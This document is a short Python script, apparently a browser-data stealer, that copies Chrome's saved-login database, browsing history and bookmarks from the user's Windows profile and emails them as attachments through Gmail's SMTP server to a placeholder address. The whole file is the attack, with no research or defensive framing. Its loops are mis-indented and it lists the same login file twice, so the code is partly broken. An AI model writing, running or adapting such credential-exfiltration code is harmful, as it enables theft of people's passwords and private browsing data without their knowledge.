import os
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

#email address of sender and recipient
sender_email = 'e-mail'
receiver_email = 'e-mail'

#password file paths
password_files = ['Login Data', 'Login Data']

#file paths with browsing history and bookmarks
history_file_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'History')
bookmarks_file_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Bookmarks')

#temporary directory for files
temp_dir = './temp'

#create a temporary directory
if not os.path.exists(temp_dir):
    os.makedirs(temp_dir)

#copying files to a temporary directory
for file in password_files:
    password_db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', file)
if os.path.exists(password_db_path):
    shutil.copy2(password_db_path, os.path.join(temp_dir, f'{file}.db'))
    
#copying browsing history and bookmark files to a temporary directory
if os.path.exists(history_file_path):
    shutil.copy2(history_file_path, os.path.join(temp_dir, 'History'))
if os.path.exists(bookmarks_file_path):
    shutil.copy2(bookmarks_file_path, os.path.join(temp_dir, 'Bookmarks'))

#creation of e-mail messages
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = receiver_email
msg['Subject'] = 'Files with passwords, browsing history and bookmarks from Chrome browser'

#adding content to messages
text = MIMEText('Attached are files with passwords, browsing history and bookmarks from the Chrome browser.')
msg.attach(text)

#adding attachments to messages
for file in password_files:
    file_path = os.path.join(temp_dir, f'{file}.db')
with open(file_path, 'rb') as f:
    attach = MIMEApplication(f.read(), _subtype='db')
    attach.add_header('Content-Disposition', 'attachment', filename=file + '.db')
    msg.attach(attach)
if os.path.exists(os.path.join(temp_dir, 'History')):
    with open(os.path.join(temp_dir, 'History'), 'rb') as f:
        attach = MIMEApplication(f.read(), _subtype='sqlite')
        attach.add_header('Content-Disposition', 'attachment', filename='History.sqlite')
        msg.attach(attach)
if os.path.exists(os.path.join(temp_dir, 'Bookmarks')):
    with open(os.path.join(temp_dir, 'Bookmarks'), 'rb') as f:
        attach = MIMEApplication(f.read(), _subtype='json')
        attach.add_header('Content-Disposition', 'attachment', filename='Bookmarks.json')
        msg.attach(attach)
        
# sending messages
with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
    smtp.starttls()
    smtp.login(sender_email, 'Password or google login key')
    smtp.sendmail(sender_email, receiver_email, msg.as_string())